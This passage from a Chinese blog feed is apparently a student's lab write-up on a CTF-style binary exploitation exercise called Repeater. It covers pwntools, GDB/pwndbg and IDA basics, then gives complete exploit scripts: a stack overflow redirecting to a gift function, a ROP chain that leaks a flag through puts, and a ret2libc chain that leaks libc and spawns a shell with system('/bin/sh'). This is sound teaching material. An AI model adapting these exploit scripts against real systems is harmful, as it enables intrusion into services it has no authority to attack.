class="string">&quot;exploime.example.com&quot;</span>,<span class="number">3333</span>)</span><br><span class="line">r.recv()          <span class="comment"># 接收数据，一直接收</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;111&quot;</span>)</span><br><span class="line"><span class="comment"># 接收到111结束，可以裁剪，如.[1:4]</span></span><br><span class="line">r.recvline()   <span class="comment"># 接收到换行结束</span></span><br><span class="line">r.recvline(n)     <span class="comment"># 接收到n个换行结束</span></span><br><span class="line">r.recvall()<span class="comment"># 接收到EOF</span></span><br><span class="line">r.recvrepeat(timeout=default) <span class="comment"># 接收到EOF或timeout</span></span><br></pre></td></tr></table></figure><h6 id="2）发送："><a href="#2）发送：" class="headerlink" title="2）发送："></a>2）发送：</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">r = remote(<span class="string">&quot;exploime.example.com&quot;</span>,<span class="number">3333</span>)</span><br><span class="line">r.send(data)    <span class="comment"># 发送数据</span></span><br><span class="line">r.sendline(data) <span class="comment"># 发送一行数据，在末尾回家\n</span></span><br><span class="line">r.sendlineafter(delims,data)</span><br><span class="line"><span class="comment"># 程序接收到delims再发送data</span></span><br><span class="line">r.send(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互模式，一般写在最后，在拿到服务器的shell之后进行的函数</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h6 id="3）字符串与地址的转换"><a href="#3）字符串与地址的转换" class="headerlink" title="3）字符串与地址的转换"></a>3）字符串与地址的转换</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p64(),p32() <span class="comment"># 将字符串转化为ascii字节流</span></span><br><span class="line">u64(),u32() <span class="comment"># 将ascii的字节流解包为字符串地址</span></span><br></pre></td></tr></table></figure><p>p64和u64都是对64位程序使用的，需要8-byte的数据一次，而p32和u32需要4-byte数据一次。p64作用：因为python中的地址，虽然是16进制，但是要想被程序读取成地址，就得将地址转换位ascii字节流，像下边这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打包</span></span><br><span class="line">ret = <span class="number">0x40140A</span> <span class="comment"># 十六进制的地址</span></span><br><span class="line"><span class="built_in">print</span>(p64(ret)) </span><br><span class="line"><span class="comment"># -&gt; b&#x27;\n\x14@\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解包</span></span><br><span class="line">data = <span class="string">b&#x27;\n\x14@\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(data)))</span><br><span class="line"><span class="comment"># -&gt; 0x40140a</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>除了Pwntools外，还有一个个人开发的zio，也是一个CTF框架</p><h4 id="使用GDB"><a href="#使用GDB" class="headerlink" title="使用GDB"></a>使用GDB</h4><h5 id="关于GDB"><a href="#关于GDB" class="headerlink" title="关于GDB"></a>关于GDB</h5><blockquote><p>UNIX及UNIX-like下的<a href="https://baike.baidu.com/item/%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7/53352344">调试工具</a>。或许，各位比较喜欢那种图形界面方式的，像VC、BCB等IDE的调试，但如果你是在 UNIX平台下做软件，你会发现GDB这个调试工具相比于VC、z的优点是具有修复网络断点以及恢复链接等功能，比BCB的图形化调试器有更强大的功能。所谓“尺有所短，寸有所长”就是这个道理。</p></blockquote><p>GDB是GNU开源组织发布的一个强大的Linux下的</p><p>程序调试工具，其可以下断点、查看程序内存等，安装方式：</p><p><code> sudo apt install gdb</code></p><p>因为原始的GDB界面对调试不太友好，所以我们需要装一个插件——<strong>pwndbg</strong></p><p>pwngdb是一个GDB的插件，可以让界面更加美观，更容易上手</p><p>项目地址：<a href="https://github.com/pwndbg/pwndbg">https://github.com/pwndbg/pwndbg</a></p><p>安装方式：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h5 id="GDB的使用"><a href="#GDB的使用" class="headerlink" title="GDB的使用"></a>GDB的使用</h5><h6 id="1）断点"><a href="#1）断点" class="headerlink" title="1）断点"></a><strong>1）断点</strong></h6><ul><li>b+函数名（符号）</li><li>b + *地址</li><li>del + 断点id</li><li>del 删除所有断点</li><li>info b 查看所有断断点</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b main</span></span><br><span class="line">Breakpoint 1 at 0x40140b</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b *0x401409</span></span><br><span class="line">Breakpoint 4 at 0x401409</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">info b</span></span><br><span class="line">Num     Type           Disp Enb Address            What</span><br><span class="line">3       breakpoint     keep y   0x000000000040140b &lt;main&gt;</span><br><span class="line">4       breakpoint     keep y   0x0000000000401409 &lt;vuln+214&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="2）运行"><a href="#2）运行" class="headerlink" title="2）运行"></a><strong>2）运行</strong></h6><ul><li>file + 程序名 加载程序</li><li>或者直接在 shell 里面 gdb + 程序名</li><li>run &#x2F; r      运行程序</li><li>c     continue继续执行程序</li><li>gdb attach PID   通过进程号调试程序</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn  #调试pwn程序</span><br><span class="line"></span><br><span class="line">ps -ef | grep pwn  #查看pwn程序的进程</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hnx123     13906   13902  0 04:45 ?        00:00:00 [pwn] &lt;defunct&gt;</span></span><br><span class="line"></span><br><span class="line">gdb attach 13906   #通过进程号附着在程序上</span><br></pre></td></tr></table></figure><h6 id="3）程序跟进"><a href="#3）程序跟进" class="headerlink" title="3）程序跟进"></a><strong>3）程序跟进</strong></h6><ul><li>s &#x2F; n 分别对应 step into 和 step over，需要在有调试信息的情况下使用</li><li>si &#x2F; ni 汇编级的 step into 和 step over。</li></ul><h6 id="4）查看内存"><a href="#4）查看内存" class="headerlink" title="4）查看内存"></a><strong>4）查看内存</strong></h6><ul><li>p *数据地址</li><li>x + 地址</li><li>p + $寄存器</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p *0x7ffc054e88f0</span></span><br><span class="line"><span class="meta prompt_"> $</span><span class="language-bash">3 = 32</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x 0x7ffc054e88f0</span>   </span><br><span class="line"> 0x7ffc054e88f0:0x00000020</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">p <span class="variable">$rsp</span>   <span class="comment">#查看寄存器</span></span></span><br><span class="line"><span class="meta prompt_"> $</span><span class="language-bash">6 = (void *) 0x7ffc054e88e8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="5）pwndbg扩展"><a href="#5）pwndbg扩展" class="headerlink" title="5）pwndbg扩展"></a><strong>5）pwndbg扩展</strong></h6><ul><li>stack &#x2F; stack + n 查看栈 &#x2F; 查看 n 项栈内容</li><li>telescope + 地址  查看某段地址的附近</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">stack 5   <span class="comment"># 查看栈顶5条数据</span></span></span><br><span class="line"> 00:0000│ rsp 0x7ffc054e88e8 —▸ 0x7fd8aff67bcf ◂— test   rax, rax</span><br><span class="line"> 01:0008│     0x7ffc054e88f0 ◂— 0x20 /* &#x27; &#x27; */</span><br><span class="line"> 02:0010│     0x7ffc054e88f8 ◂— 0x8</span><br><span class="line"> 03:0018│     0x7ffc054e8900 ◂— 0x46474e550</span><br><span class="line"> 04:0020│     0x7ffc054e8908 —▸ 0x7fd8b00c3980 ◂— 0xfbad208b</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">telescope 0x401409</span></span><br><span class="line"> 00:0000│  0x401409 ◂— leave  </span><br><span class="line"> 01:0008│  0x401411 ◂— mov    ebp, esp</span><br><span class="line"> 02:0010│  0x401419 ◂— add    byte ptr [rax - 0x75], cl</span><br><span class="line"> 03:0018│  0x401421 ◂— mov    ecx, 0</span><br><span class="line"> 04:0020│  0x401429 ◂— add    byte ptr [rax], al</span><br><span class="line"> 05:0028│  0x401431 ◂— mov    edi, eax</span><br><span class="line"> 06:0030│  0x401439 ◂— mov    eax, dword ptr [rip + 0x2c61]</span><br><span class="line"> 07:0038│  0x401441 ◂— add    byte ptr [rax], al</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/05/COdgu3RscWBUHyo.png"></p><h4 id="使用IDA"><a href="#使用IDA" class="headerlink" title="使用IDA"></a>使用IDA</h4><h5 id="关于IDA"><a href="#关于IDA" class="headerlink" title="关于IDA"></a>关于IDA</h5><p><img src="https://s2.loli.net/2022/04/05/jOQfZXLyipHDFtN.png"></p><blockquote><p>交互式反汇编器专业版（Interactive Disassembler Professional），人们常称其为IDA Pro，或简称为IDA。是最棒的一个静态反编译软件，为众多<a href="https://baike.baidu.com/item/0day/4885829">0day</a>世界的成员和<a href="https://baike.baidu.com/item/ShellCode">ShellCode</a>安全分析人士不可缺少的利器！IDA Pro是一款交互式的，可编程的，可扩展的，多处理器的，交叉Windows或<a href="https://baike.baidu.com/item/Linux">Linux</a> <a href="https://baike.baidu.com/item/WinCE">WinCE</a> <a href="https://baike.baidu.com/item/MacOS">MacOS</a>平台主机来分析程序， 被公认为最好的花钱可以买到的<a href="https://baike.baidu.com/item/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/5097433">逆向工程</a>利器。IDA Pro已经成为事实上的分析敌意代码的标准并让其自身迅速成为攻击研究领域的重要工具。它支持数十种CPU指令集其中包括[Intel x86](<a href="https://baike.baidu.com/item/Intel">https://baike.baidu.com/item/Intel</a> x86)，<a href="https://baike.baidu.com/item/x64/8161446">x64</a>，<a href="https://baike.baidu.com/item/MIPS/2173143">MIPS</a>，<a href="https://baike.baidu.com/item/PowerPC">PowerPC</a>，<a href="https://baike.baidu.com/item/ARM/7518299">ARM</a>，<a href="https://baike.baidu.com/item/Z80">Z80</a>，<a href="https://baike.baidu.com/item/68000/1255747">68000</a>，c8051等等。</p></blockquote><p>这是一个Windows下非常好用的反汇编软件，功能非常强大</p><p><img src="https://s2.loli.net/2022/04/05/25hd4yMiGT7kc3X.png"></p><p><img src="https://s2.loli.net/2022/04/05/FYpcI51i6vWOLbX.png"><br>在加载出汇编代码后，按下F5就可以看到又汇编代码生成的伪代码：</p><p><img src="https://s2.loli.net/2022/04/05/12nRigUsMPTZ4NY.png"></p><p>通过IDA分析，可以很容易可以分析出各种函数的地址，还有内存中的一些地址，非常滴有用</p><p>铺垫了这么多，终于可以开始讲第一个程序Repeater了。</p><h3 id="1-Repeater"><a href="#1-Repeater" class="headerlink" title="1) Repeater"></a>1) Repeater</h3><p>我在这里主要介绍对Repeater程序的攻击：</p><p>首先，这个程序的功能就是发送给你一个4位数字，然后你需要将这个数字发送回去给程序，程序就会发送给你一个新的4位数字，然后就一直循环下去了……效果如下图所示：</p><p><img src="https://s2.loli.net/2022/04/05/AqnWdNpIsV3LmFM.png"></p><p>如果你不按要求来重复数字的话，嘿嘿，那你就 不是一个Repeater！！！</p><p><img src="https://s2.loli.net/2022/04/05/MFzkOmXrsqGLlph.png"></p><p>就是这么一个功能简单的程序，里面放了五个Flag（Flag相当于游戏里面的成就，拿到就会得到相应的分数，还有大大滴成就感XD），下面列举这五个Flag的达成条件：</p><ul><li><strong>Flag1</strong>：重复一百次可取得；</li><li><strong>Flag2</strong>：调用gift函数可取得；</li><li><strong>Flag3</strong>：输入10423进入里世界后，输入负数或超大数可取得；</li><li><strong>Flag4</strong>：泄漏出puts地址后，打印变量储存Flag4的变量可取得；</li><li><strong>Flag5</strong>：拿到shell后，查看服务器目录可取得；</li></ul><p>对于Flag1，重复一百次即可，当然，不可能手动了，用pwntools写个脚本来自动执行就好了，Flag1:</p><p><img src="https://s2.loli.net/2022/04/05/ChZeQ4O8oq5itwb.png"></p><p>接下来的<strong>Flag2</strong>就开始有难度了，要通过调用gift函数才可以拿到旗子。通过分析程序可以发现，在重复的时候输入10423可以进入里世界（一个彩蛋界面）</p><p><img src="https://s2.loli.net/2022/04/05/qsAlN2kCvxVctpD.png"></p><p>在这个Input size里，可以使用了scanf函数，存在着栈溢出漏洞，通过利用漏洞可以覆盖返回地址进行ROP。</p><p><img src="https://s2.loli.net/2022/04/05/LhGjdSCrxKUIla8.png"></p><p>通过分析scanf输入的变量可知，v3存在距离rbp（栈底）偏移8个字节的地方，也就是说只要把着8个字节覆盖掉，再覆盖掉一个old rbp（也是8个字节），就能覆盖返回地址了，这样一来就能劫持控制流了。然而理想很美好，现实很骨感，单单覆盖掉8+8个字节并不能成功，这和学长上课时候演示的不一样。因此只能通过GDB打断点调试，看看是那里出了问题，我选择在函数的ret之前打个断点看看栈的填充情况，一看，果然是没填充满栈帧，</p><p><img src="https://s2.loli.net/2022/04/05/TftjcHdZoxSMQYu.png"></p><p>观察栈帧和寄存器的值，不停的增加填充量，最后终于填充成功了，变成了31+8（我也不知道为啥是31+8），最后成功覆盖了返回地址，使其跳转到了gift函数的地址</p><p><img src="https://s2.loli.net/2022/04/05/XPYHuZvtD9asMdz.png"></p><p>最后成功的拿到Flag2了呢</p><p><img src="https://s2.loli.net/2022/04/05/3iZFLwCWRou2xzg.png"></p><p>Flag2代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.address))</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;10423&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">p.sendline(code.encode())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(<span class="number">0x4012b6</span>)   <span class="comment">#填充量31+8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br></pre></td></tr></table></figure><p>拿到Flag2之后，Flag3就很容易了，只要满足以下条件就能拿到了</p><p><img src="https://s2.loli.net/2022/04/05/XAGhVtk6CWQxiHn.png"></p><p>即找到一个数，是之不大于16，同时又大于0x10就可以了，因为第一个判断是把无符号整型转换为了普通整型，所以当你输入一个负数的时候，负数会小于第一个16，而第二个判断还是无符号整型，所以该整型会变成一个非常大的数。然后既可以拿到Flag3啦</p><p><img src="https://s2.loli.net/2022/04/05/9ifHF7leTxKC18A.png"></p><p>Flag4的话，又要用到一点新手段了，因为程序里没有直接的代码可以输出Flag4，所以需要我们自己构造ROP链来输出Flag4</p><p>因为函数中使用了puts函数，所以在程序的plt表中会有调用puts函数的代码，然后，再使用<strong>ROPgadget</strong>来找一段小代码片段，</p><p><code>pop ret rdi</code></p><p>有了这个片段之后，就可以把想要输出的数据存进RDI寄存器中并压入栈中，并被puts输出。</p><p>首先先找一下小片段代码的地址</p><p><img src="https://s2.loli.net/2022/04/05/bBrwV91pyLd6tFZ.png"></p><p>可以看到，程序中确实有这一段代码可以用，然后，按照函数调用的方式，构造ROP链</p><p>Flag4代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.address))</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = <span class="string">&#x27;10423&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">p.sendline(code.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004016a3</span>   <span class="comment">#找到的符合条件的一小段代码片段</span></span><br><span class="line">target = <span class="number">0x4040E0</span>    <span class="comment">#Flag4的变量地址</span></span><br><span class="line"></span><br><span class="line">f = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(target) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"><span class="comment">#根据函数调用的方式构造的ROP链，相当于执行函数puts(flag4)</span></span><br><span class="line"></span><br><span class="line">p.sendline(f)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>拿到Flag4力：</p><p><img src="https://s2.loli.net/2022/04/05/yFw3P6lS9jqCizh.png"></p><p>最后一个Flag5，要用到ret2libc，非常的麻烦（当然是对我这种菜鸡来说: (。），简单说一下什么是ret2libc，原理：</p><blockquote><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p></blockquote><p>在这个程序中，我们可以通过调用动态链接库<code>libc.so</code>里面里面的<code>system</code>函数和<code>/bin/sh</code>字符串，构造出<code>system(&quot;/bin/sh&quot;)</code>就可以拿到Shell了，那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong>这里我选择之前的puts函数，使用其泄露的地址即可。此外， 在libc 中也是有 <code>/bin/sh</code> 字符串的，所以我们可以一起获得 <code>/bin/sh </code>字符串的地址。</p><p>Flag5的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)   <span class="comment"># 本次实验提供了与服务器端相同的libc库，</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.address))</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">code = <span class="string">&#x27;10423&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">p.sendline(code.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004016a3</span></span><br><span class="line">target = <span class="number">0x4040E0</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40140A</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x31</span> + <span class="string">b&#x27;x&#x27;</span>*<span class="number">0x8</span> + p64(pop_rdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x401333</span>)</span><br><span class="line"><span class="comment"># 泄露puts函数地址，相当于puts(got.puts)</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment"># 使用泄露出来的地址减去libc中对应的地址，得到基地址</span></span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># 构造system函数的地址</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>):</span><br><span class="line">binsh = i</span><br><span class="line"></span><br><span class="line">binsh = libc_base + binsh</span><br><span class="line"><span class="comment"># 构造/bin/sh字符串的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x38</span>   <span class="comment">#填充量，不知为啥，这次填充比第一次多了7个字节，明明是一样的函数</span></span><br><span class="line">payload += p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>通过这种比较厉害的手段，就可以拿到服务器的shell了，Flag全家福如下：</p><p><img src="https://s2.loli.net/2022/04/06/OBYjdFscGNmEzgK.png"></p><p>终于Repeater全成就了，呜呜呜，好有成就感。</p><h3 id="2）QDOJ"><a href="#2）QDOJ" class="headerlink" title="2）QDOJ"></a>2）QDOJ</h3><h3 id="3-C4"><a href="#3-C4" class="headerlink" title="3) C4"></a>3) C4</h3><h2 id="3-实验总结"><a href="#3-实验总结" class="headerlink" title="3.实验总结"></a>3.实验总结</h2>]]></content>
      
      
      
        <tags>
            
            <tag> 网络破防实践先导 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>网络破防实践先导实验一————数组越界检测心得</title>
      
      <link href="/archives/94f62543.html"/>
      <url>/archives/94f62543.html</url>
      
